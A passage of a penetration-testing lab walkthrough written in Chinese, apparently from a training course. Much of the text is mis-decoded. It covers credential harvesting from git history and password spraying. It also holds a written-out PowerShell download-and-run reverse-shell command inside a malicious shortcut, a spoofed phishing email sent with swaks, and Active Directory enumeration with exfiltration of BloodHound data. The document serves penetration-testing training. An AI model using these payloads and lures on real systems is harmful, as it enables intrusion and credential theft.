#### 3. ä½¿ç”¨ `.git` å°‹æ‰¾æ•æ„Ÿè³‡è¨Š
```
root@websrv1:/srv/www/wordpress# git status
HEAD detached at 612ff57
nothing to commit, working tree clean
root@websrv1:/srv/www/wordpress# git log
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root <root@websrv1>
Date:   Tue Sep 27 14:24:28 2022 +0000

    initial commit

```
> æŸ¥çœ‹ `612ff5783cc5dbd1e0e008523dba83374a84aaf1`: Removed staging script and internal network access

```
root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644
index 25667c7..0000000
--- a/fetch_current.sh
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-# Script to obtain the current state of the web app from the staging server
-
-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
```
> `john`:`dqsTwTpZPn#nL` IP: `192.168.50.245`

#### 4. è¨˜éŒ„æ–°ç²å¾—çš„æ†‘è­‰
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ echo "john: dqsTwTpZPn#nL (192.168.50.245)" >> creds.txt
```
## Gaining Access to the Internal Network
### Domain Credentials
#### 1. ç¢ºèªç¾æœ‰çš„æ†‘è­‰
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cat creds.txt    
daniela: tequieromucho
DB_USER: wordpress, DB_PASSWORD: DanielKeyboard3311
john: dqsTwTpZPn#nL (192.168.50.245)

```
> å·²ç™¼ç¾çš„ä½¿ç”¨è€…: `marcus`, `daniela`, `john`

å»ºç«‹æ¸¬è©¦å¸³è™Ÿèˆ‡å¯†ç¢¼åˆ—è¡¨:
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cat usernames.txt 
marcus
john
daniela

â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cat passwords.txt      
tequieromucho
DanielKeyboard3311
dqsTwTpZPn#nL
```
#### 2. CrackMapExec æ¸¬è©¦å¸³å¯†çµ„åˆ
ä½¿ç”¨ CrackMapExec æ¸¬è©¦é€™äº›å¸³å¯†æ˜¯å¦èƒ½ç™»å…¥ MAILSRV1 (é€é SMB å”è­°)
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ crackmapexec smb 192.168.117.242 -u usernames.txt -p passwords.txt --continue-on-success
SMB         192.168.117.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE
```
> `john`:`dqsTwTpZPn#nL` ç™»å…¥ `MAILSRV1`\
> ä¸”ç¢ºèª MAILSRV1 åŠ å…¥ `beyond.com` ç¶²åŸŸï¼Œåœ¨å…§ç¶²çš„ä¸€éƒ¨åˆ†

#### 3. åˆ—èˆ‰ `MAILSRV1` çš„ SMB è³‡æ–™å¤¾
john çš„å¸³å¯†æœ‰æ•ˆï¼Œå˜—è©¦åˆ—èˆ‰ `MAILSRV1` å…±äº«çš„è³‡æ–™å¤¾
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ crackmapexec smb 192.168.117.242 -u john -p "dqsTwTpZPn#nL" --shares
SMB         192.168.117.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.117.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.117.242 445    MAILSRV1         [+] Enumerated shares
SMB         192.168.117.242 445    MAILSRV1         Share           Permissions     Remark
SMB         192.168.117.242 445    MAILSRV1         -----           -----------     ------
SMB         192.168.117.242 445    MAILSRV1         ADMIN$                          Remote Admin
SMB         192.168.117.242 445    MAILSRV1         C$                              Default share
SMB         192.168.117.242 445    MAILSRV1         IPC$            READ            Remote IPC

``` 
> æ²’æœ‰å¯è®€å–çš„å…±äº«è³‡æ–™å¤¾

### Phishing for Access
ç„¡æ³•é€é MAILSRV1 ç›´æ¥é€²å…¥å…§éƒ¨ç¶²è·¯ï¼Œå¯ä»¥é¸æ“‡ Client-Side Attack
å¸¸è¦‹çš„ å®¢æˆ¶ç«¯æ”»æ“Šæ–¹å¼ ï¼š\
- é€é Microsoft Office æ–‡ä»¶ä¸­çš„å·¨é›† (Macro) ä¾†åŸ·è¡Œæƒ¡æ„ç¨‹å¼
- ä½¿ç”¨ Windows Library (.Library-ms) + å¿«æ·æ–¹å¼ (.lnk) åŸ·è¡Œæƒ¡æ„å‘½ä»¤

#### 1. å»ºç«‹ WebDAV Server
æä¾›ä¸€å€‹é ç«¯å…±äº«ä¾†å„²å­˜ `.Library-ms` æª”æ¡ˆï¼Œå°è‡´å…§éƒ¨ä½¿ç”¨è€…é»æ“Š `.lnk` æ™‚ï¼Œç³»çµ±æœƒå¾ WebDAV ä¼ºæœå™¨ä¸‹è¼‰æƒ¡æ„æŒ‡ä»¤
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ mkdir webdav 
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ pip3 install --user wsgidav
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ /home/chw/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/chw/beyond/webdav/
Running without configuration file.
09:41:20.250 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
09:41:20.251 - INFO    : WsgiDAV/4.3.3 Python/3.11.9 Linux-6.8.11-arm64-aarch64-with-glibc2.38
09:41:20.251 - INFO    : Lock manager:      LockManager(LockStorageDict)
09:41:20.251 - INFO    : Property manager:  None
09:41:20.251 - INFO    : Domain controller: SimpleDomainController()
09:41:20.251 - INFO    : Registered DAV providers by route:
09:41:20.251 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/chw/.local/lib/python3.11/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
09:41:20.251 - INFO    :   - '/': FilesystemProvider for path '/home/chw/beyond/webdav' (Read-Write) (anonymous)
09:41:20.251 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
09:41:20.251 - WARNING : Share '/' will allow anonymous write access.
09:41:20.251 - WARNING : Share '/:dir_browser' will allow anonymous write access.
09:41:20.269 - INFO    : Running WsgiDAV/4.3.3 Cheroot/10.0.0 Python/3.11.9
09:41:20.269 - INFO    : Serving on http://0.0.0.0:80 ...
```
> æˆåŠŸå•Ÿå‹• WebDAV ä¼ºæœå™¨ï¼Œæä¾›åŒ¿åè®€å–/å¯«å…¥æ¬Šé™

#### 2. å»ºç«‹ Windows Library (.Library-ms) æª”æ¡ˆ
ç™»å…¥ RDP (192.168.117.250)ï¼Œå»ºç«‹ Windows Library å’Œ shortcut files
```
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ xfreerdp  /u:offsec  /p:lab /v:192.168.117.250
```
![image](https://hackmd.io/_uploads/rJPUKewh1g.png)\
å»ºç«‹ Library æ–‡ä»¶ (`config.Library-ms`)
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.214</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
![image](https://hackmd.io/_uploads/HJxt-bP31g.png)


`.Library-ms` æª”æ¡ˆæœƒè®“ Windows å˜—è©¦å­˜å– WebDAV ä¼ºæœå™¨\
æ¥è‘—å°‡ `.Library-ms` å‚³å› Kali
```
PS C:\Users\offsec\Desktop> scp config.Library-ms chw@192.168.45.214:/home/chw/beyond/
chw@192.168.45.214's password:
config.Library-ms
```

#### 3. å»ºç«‹æƒ¡æ„ `.lnk` shortcut files
å»ºç«‹æ·å¾‘ï¼š\
![image](https://hackmd.io/_uploads/HJyB5lv3Jx.png)
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.214:8000/powercat.ps1'); powercat -c 192.168.45.214 -p 8888 -e powershell"
```
> - å¾ Kali ä¼ºæœå™¨ (http://192.168.45.214:8000) ä¸‹è¼‰ `powercat.ps1`\
> - ä½¿ç”¨ PowerCat å»ºç«‹åå‘ Shell (nc -nvlp 8888)\
> - å›é€£åˆ° Kali æ©Ÿå™¨ (192.168.45.214:8888)

![image](https://hackmd.io/_uploads/rJ6dcxPnJe.png)\
æ¥è‘—å‚³å› WebDav\
![image](https://hackmd.io/_uploads/r15EfZP2ke.png)


#### 4. è¨­å®š PowerCat Server
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
#### 5. å•Ÿå‹• Netcat ç›£è½
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ nc -nvlp 8888
listening on [any] 8888 ..
```
#### 6. ç™¼é€é‡£é­šéƒµä»¶
åœ¨ `/beyond/webdav` å»ºç«‹ body.tx
```                                   
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond/webdav]
â””â”€$ cat body.txt        
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```
> å½è£æˆå…§éƒ¨ IT äººå“¡ï¼Œèª˜å°å—å®³è€…é–‹å•Ÿ `.Library-ms` æª”æ¡ˆ

ä½¿ç”¨ `swaks` é€å‡ºé‡£é­šéƒµä»¶
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond/webdav]
â””â”€$ ls
body.txt  config.Library-ms  powershell.lnk
       
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond/webdav]
â””â”€$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.117.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
[sudo] password for chw: 
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.117.242:25...
=== Connected to 192.168.117.242.
<-  220 MAILSRV1 ESMTP
 -> EHLO CHW.CHW
<-  250-MAILSRV1
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> am9obg==
<-  334 UGFzc3dvcmQ6
 -> ZHFzVHdUcFpQbiNuTA==
<-  235 authenticated.
 -> MAIL FROM:<john@beyond.com>
<-  250 OK
 -> RCPT TO:<marcus@beyond.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 72 lines sent
<-  250 Queued (13.172 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```
> `-t daniela@beyond.com -t marcus@beyond.com`: æ”¶ä»¶äººçµ¦ daniela å’Œ marcus\
`--from john@beyond.com`: å¯„ä»¶äººå½é€  john@beyond.com\
`--attach @config.Library-ms`: é™„ä»¶ `config.Library-ms`\
`--server 192.168.117.242`: æŒ‡å®š SMTP ä¼ºæœå™¨ (MAILSRV1)\
`--body @body.txt`:éƒµä»¶å…§å®¹\
`--header "Subject: Staging Script"`: éƒµä»¶æ¨™é¡Œï¼ˆ"Staging Script"ï¼‰\
`--suppress-data`: éš±è—éƒµä»¶å…§å®¹ç´°ç¯€ï¼Œåªé¡¯ç¤º SMTP çµæœ\
`-ap`: å•Ÿç”¨èº«ä»½é©—è­‰
>> æˆåŠŸé€å‡º

#### 7. æˆåŠŸç²å¾—å…§éƒ¨ç¶²è·¯å­˜å–
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.117.242 - - [18/Mar/2025 10:27:07] "GET /powercat.ps1 HTTP/1.1" 200 -

```
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ nc -nvlp 8888
listening on [any] 8888 ...

connect to [192.168.45.214] from (UNKNOWN) [192.168.117.242] 62505
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus
PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1
PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.73.243
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.73.254
PS C:\Windows\System32\WindowsPowerShell\v1.0> 
```

## Enumerating the Internal Network
- è’é›†å…§éƒ¨ç¶²è·¯çš„è³‡è¨Š
- æšèˆ‰ AD ç’°å¢ƒï¼Œå°‹æ‰¾ç”¨æˆ¶ã€é›»è…¦ã€ç¶²åŸŸç®¡ç†å“¡ç­‰è³‡è¨Š
### Situational Awareness
å‰å·²ç¶“æˆåŠŸå–å¾— CLIENTWK1 çš„åå‘ Shell
#### 1. å–å¾— CLIENTWK1 çš„åŸºæœ¬è³‡è¨Š
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cp /home/chw/winPEASx64.exe .
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ python3 -m http.server 8000
```
```
PS C:\Users\marcus> iwr -uri http://192.168.45.214:8000/winPEASx64.exe -Outfile winPEAS.exe                 
iwr -uri http://192.168.45.214:8000/winPEASx64.exe -Outfile winPEAS.exe
PS C:\Users\marcus>.\winPEAS.exe
...
ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í¹ Basic System Information
ï¿½ Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    Hostname: CLIENTWK1
    Domain Name: beyond.com
    ProductName: Windows 10 Pro
    EditionID: Professional
...
AV Information:
No AV was detected!!
...
ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í¹ Network Ifaces and known hosts
ï¿½ The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:AB:26:41]: 172.16.73.243 / 255.255.255.0
        Gateways: 172.16.73.254
        DNSs: 172.16.73.240
        Known hosts:
          172.16.73.240         00-50-56-AB-13-3B     Dynamic
          172.16.73.254         00-50-56-AB-A8-17     Dynamic
          172.16.73.255         FF-FF-FF-FF-FF-FF     Static

...

ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í¹ DNS cached --limit 70--
    Entry                                 Name                                  Data
    mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.73.254
                  
PS C:\Users\marcus> systeminfo
Host Name:                 CLIENTWK1
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
...
```
> 1. CLIENTWK1 å±¬æ–¼ beyond.com ç¶²åŸŸï¼Œä¸¦é‹è¡Œ Windows 10 Pro (å¯¦éš›ä¸Šæ˜¯ Windows 11)
> 2. æ²’æœ‰åµæ¸¬åˆ°é˜²æ¯’è»Ÿé«”ï¼Œè¡¨ç¤ºå¯ä»¥ä»»æ„åŸ·è¡Œæƒ¡æ„å·¥å…·
> 3. `172.16.73.240` : å¯èƒ½æ˜¯ DC (DCSRV1)
> 4. `172.16.73.254 `: `MAILSRV1` å…§éƒ¨ IP (ä¹‹å‰å¾å¤–éƒ¨é€£ç·šæ™‚æ˜¯ 192.168.117.242ï¼Œè¡¨ç¤ºé›™ç¶²å¡è¨­å‚™)

ç´€éŒ„é€™äº›è³‡è¨Š
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cat computer.txt             
172.16.73.240 - DCSRV1.BEYOND.COM  # å¯èƒ½æ˜¯ç¶²åŸŸæ§åˆ¶å™¨
172.16.73.254 - MAILSRV1.BEYOND.COM  # å…§éƒ¨éƒµä»¶ä¼ºæœå™¨ï¼Œé›™ç¶²å¡è¨­å‚™
172.16.73.243 - CLIENTWK1.BEYOND.COM  # ç›®å‰æˆ‘å€‘å…¥ä¾µçš„é›»è…¦
```
#### 2. Active Directory æšèˆ‰
ä½¿ç”¨ BloodHound æƒæ ç¶²åŸŸå…§çš„ç”¨æˆ¶ã€é›»è…¦å’Œç®¡ç†å“¡ã€‚
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```
```
PS C:\Users\marcus> iwr -uri http://192.168.45.214:8000/SharpHound.ps1 -Outfile SharpHound.ps1
iwr -uri http://192.168.45.214:8000/SharpHound.ps1 -Outfile SharpHound.ps1
PS C:\Users\marcus> powershell -ep bypass
powershell -ep bypass
PS C:\Users\marcus> . .\SharpHound.ps1
. .\SharpHound.ps1
PS C:\Users\marcus> . .\SharpHound.ps1
. .\SharpHound.ps1
PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All
2025-03-18T08:57:54.4374618-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2025-03-18T08:57:54.5468360-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-03-18T08:57:54.5468360-07:00|INFORMATION|Initializing SharpHound at 8:57 AM on 3/18/2025
2025-03-18T08:57:54.6093337-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for beyond.com : DCSRV1.beyond.com
2025-03-18T08:57:54.7812108-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-03-18T08:57:54.8749602-07:00|INFORMATION|Beginning LDAP search for beyond.com
2025-03-18T08:57:54.8905900-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-03-18T08:57:54.8905900-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-03-18T08:58:25.8281459-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 99 MB RAM
2025-03-18T08:58:37.5781689-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2025-03-18T08:58:37.5937523-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2025-03-18T08:58:37.6718771-07:00|INFORMATION|Status: 97 objects finished (+97 2.309524)/s -- Using 105 MB RAM
2025-03-18T08:58:37.6718771-07:00|INFORMATION|Enumeration finished in 00:00:42.8001829
2025-03-18T08:58:37.7187518-07:00|INFORMATION|Saving cache with stats: 56 ID to type mappings.
 57 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-03-18T08:58:37.7187518-07:00|INFORMATION|SharpHound Enumeration Completed at 8:58 AM on 3/18/2025! Happy Graphing!
```
> æˆåŠŸåŸ·è¡Œå¾Œï¼Œæœƒç”Ÿæˆ BloodHound.zipï¼Œå†å°‡å…¶å‚³é€å› Kali åˆ†æ

#### 3. ä½¿ç”¨ BloodHound åˆ†æ AD çµæ§‹
>[!Caution]
>ç›´æ¥ä½¿ç”¨ `scp -v 20250318085837_BloodHound.zip chw@192.168.45.214:/home/chw/beyond/`\
>æœƒå€’ç½® Error: `debug1: read_passphrase: can't open /dev/tty: No such file or directory`:\
> SCP ç„¡æ³•åœ¨ Windows PowerShell ä¸­æç¤ºè¼¸å…¥å¯†ç¢¼ï¼Œå› ç‚º OpenSSH for Windows é è¨­æœƒå˜—è©¦å¾ /dev/tty è®€å–å¯†ç¢¼ï¼Œè€Œ Windows æ²’æœ‰ /dev/tty é€™å€‹è£ç½®

Kali å¯«ä¸€å€‹ upload.pyï¼Œæ¥æ”¶æª”æ¡ˆ (python http.server ä¸æ¥æ”¶ `PUT`)
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cat upload.py                   
#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer

class HTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_PUT(self):
        file_path = self.translate_path(self.path)
        length = int(self.headers['Content-Length'])
        with open(file_path, 'wb') as f:
            f.write(self.rfile.read(length))
        self.send_response(201, "Created")
        self.end_headers()

server_address = ('0.0.0.0', 8000)  # ç›£è½æ‰€æœ‰ IPï¼Œä½¿ç”¨ 8000 ç«¯å£
httpd = HTTPServer(server_address, HTTPRequestHandler)
print("Serving HTTP on port 8000 (Upload Enabled)...")
httpd.serve_forever()

â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ python3 upload.py     

Serving HTTP on port 8000 (Upload Enabled)...
192.168.117.242 - - [18/Mar/2025 13:12:47] "PUT /20250318085837_BloodHound.zip HTTP/1.1" 201 -

```
Window: marcus ä¸Šå‚³
```
PS C:\Users\marcus> Invoke-WebRequest -Uri "http://192.168.45.214:8000/20250318085837_BloodHound.zip" -Method Put -InFile "20250318085837_BloodHound.zip"
Invoke-WebRequest -Uri "http://192.168.45.214:8000/20250318085837_BloodHound.zip" -Method Put -InFile "20250318085837_BloodHound.zip"


StatusCode        : 201
StatusDescription : Created
Content           : {}
RawContent        : HTTP/1.0 201 Created
                    Date: Tue, 18 Mar 2025 17:12:47 GMT
                    Server: SimpleHTTP/0.6 Python/3.11.9
                    
                    
Headers           : {[Date, Tue, 18 Mar 2025 17:12:47 GMT], [Server, SimpleHTTP/0.6 Python/3.11.9]}
RawContentLength  : 0

```
Kali å•Ÿå‹• neo4j å’Œ BloodHound:
ä½¿ç”¨ Cypher Query Language æœå°‹
#### 3.1 æœå°‹æ‰€æœ‰é›»è…¦
```
MATCH (m:Computer) RETURN m
```
![image](https://hackmd.io/_uploads/BySlhQwnkl.png)
> æˆ‘å€‘æ“æœ‰ interactive shell çš„ `CLIENTWK1` ä¹‹å¤–ï¼ŒBloodHound é‚„è­˜åˆ¥äº†å·²çŸ¥çš„DC `DCSRV1` å’Œä¸»éƒµä»¶ä¼ºæœå™¨ MAILSRV1ã€‚æ­¤å¤–ï¼Œå®ƒé‚„ç™¼ç¾äº†å¦ä¸€å°åç‚º `INTERNALSRV1` çš„æ©Ÿå™¨ã€‚
> >`DCSRV1.BEYOND.COM` - Windows Server 2022 Standard\
`INTERNALSRV1.BEYOND.COM` - Windows Server 2022 Standard\
`MAILSRV1.BEYOND.COM` - Windows Server 2022 Standard\
`CLIENTWK1.BEYOND.COM` - Windows 11 Pro


nslookup æŸ¥è©¢ `INTERNALSRV1`
```
PS C:\Users\marcus> nslookup INTERNALSRV1.BEYOND.COM
nslookup INTERNALSRV1.BEYOND.COM
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.73.240

Name:    INTERNALSRV1.BEYOND.COM
Address:  172.16.73.241

```

æ›´æ–° Kali çš„ computer.txt:
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cat computer.txt
172.16.73.240 - DCSRV1.BEYOND.COM  # å¯èƒ½æ˜¯ç¶²åŸŸæ§åˆ¶å™¨
172.16.73.241 - INTERNALSRV1.BEYOND.COM  # å…§éƒ¨ä¼ºæœå™¨
172.16.73.254 - MAILSRV1.BEYOND.COM  # å…§éƒ¨éƒµä»¶ä¼ºæœå™¨ï¼Œé›™ç¶²å¡è¨­å‚™
172.16.73.244 - CLIENTWK1.BEYOND.COM  # ç›®å‰æˆ‘å€‘å…¥ä¾µçš„é›»è…¦

```
#### 3.1 æœå°‹æ‰€æœ‰ä½¿ç”¨è€…
```
MATCH (u:User) RETURN u
```
![image](https://hackmd.io/_uploads/BJ3Xpmwh1g.png)
> é™¤äº† AD é è¨­ user:
> BECCY\
JOHN\
DANIELA\
MARCUS
>> ç™¼ç¾æ–°çš„ domain account `BECCY`ï¼Œä¸¦ç¢ºèª `DANIELA` ä¹Ÿæ˜¯ domain user

å°‡ marcusï¼ˆCLIENTWK1 ä¸Šçš„äº’å‹•å¼ shellï¼‰å’Œ johnï¼ˆæœ‰æ•ˆæ†‘è­‰ï¼‰æ¨™è¨˜ç‚º `Owned`\
ä¸¦æ›´æ–° Kali çš„ usernames.txt:
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cat usernames.txt 
marcus
john
daniela
beccy
```
#### 3.3 æŸ¥è©¢ç¶²åŸŸç®¡ç†å“¡
é¸æ“‡ Find All Domain Admins\
![image](https://hackmd.io/_uploads/ryZcC7v3kg.png)
> Domain Admins:\
> - BECCY
> - Administrator
> > ç›®æ¨™ï¼šæ‹¿ä¸‹ `BECCY`

- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find Computers where Domain Users are Local Admin
- Shortest Path to Domain Admins from Owned Principals

Analysis çš„ä»¥ä¸Šæ¢ä»¶éƒ½ä¸ç¬¦åˆ\
å¦å¤–ï¼Œä¹Ÿæ²’æœ‰ Domain User æ˜¯ä»»ä½•æœ¬æ©Ÿçš„ Local Adminã€‚å› æ­¤ï¼Œæˆ‘å€‘æ²’æœ‰ä»¥ john æˆ– marcus èº«åˆ†å­˜å–ä»»ä½•ç¶²åŸŸé›»è…¦çš„ç‰¹æ¬Š

### Services and Sessions

>[!Note]
>é€²ä¸€æ­¥åˆ†æå…§ç¶²ç’°å¢ƒï¼Œæ‰¾å‡ºæ›´å¤šæ½›åœ¨çš„æ”»æ“Šå‘é‡ã€‚
> - æŸ¥è©¢ç›®å‰æ´»èºçš„ä½¿ç”¨è€…ç™»å…¥æœƒè©± (Sessions)
> - å°‹æ‰¾å¯ä»¥é€²è¡Œ Kerberoasting æ”»æ“Šçš„å¸³è™Ÿ
> - é€é SOCKS5 Proxy é€²è¡Œå…§éƒ¨ç¶²è·¯æƒæ
> - å­˜å– INTERNALSRV1 ä¸Šçš„ WordPress ç«™é»

#### 1. ç¢ºèªç›®å‰ç™»å…¥çš„ä½¿ç”¨è€… (Active Sessions)
Cypher æŸ¥è©¢åˆ—å‡ºæ‰€æœ‰ç™»å…¥çš„ä½¿ç”¨è€…
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```
![image](https://hackmd.io/_uploads/By_jgNPnkx.png)
> 1. CLIENTWK1 â†’ marcus (å·²çŸ¥)
>2. MAILSRV1 â†’ beccy (åŸŸç®¡ç†å“¡):è‹¥æ‹¿åˆ°æ©Ÿå™¨çš„ç‰¹æ¬Šè¨ªå•ï¼Œå°±å¯ä»¥æå–è©²ç”¨æˆ¶çš„ NTLM hash
>3. INTERNALSRV1 â†’ Administrator (æœ¬æ©Ÿç®¡ç†å“¡): RID 500

#### 2. ç¢ºèªå¯ä»¥é€²è¡Œ Kerberoasting çš„å¸³è™Ÿ
è­˜åˆ¥ç¶²åŸŸä¸­æ‰€æœ‰ kerberoastable ä½¿ç”¨è€…\
Analysis é¸æ“‡ List All Kerberoastable Accounts\
![image](https://hackmd.io/_uploads/Bk7eMEDhJx.png)
> daniela ä¹Ÿæ˜¯å¯æ”»æ“Šç›®æ¨™

daniela > Node Info > Service Principal Names\
SPN: `http/internalsrv1.beyond.com`

>[!Note]
